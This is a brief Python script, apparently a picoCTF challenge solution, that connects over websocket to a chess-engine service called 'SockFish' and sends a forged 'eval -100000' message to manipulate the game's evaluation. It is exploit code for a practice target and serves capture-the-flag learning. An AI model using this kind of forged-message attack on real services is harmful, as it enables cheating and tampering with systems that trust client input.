#!/usr/bin/env python3

# ------------------
# Ookami
# Hackers Fight Club
# ------------------

import asyncio
import websockets

async def cliente():
    uri = "ws://verbal-sleep.picoctf.net:57518/ws/"
    async with websockets.connect(uri) as websocket:
        await websocket.send("eval -100000")
        respuesta = await websocket.recv()
        print(f'Respuesta de SockFish: {respuesta}')

asyncio.run(cliente())
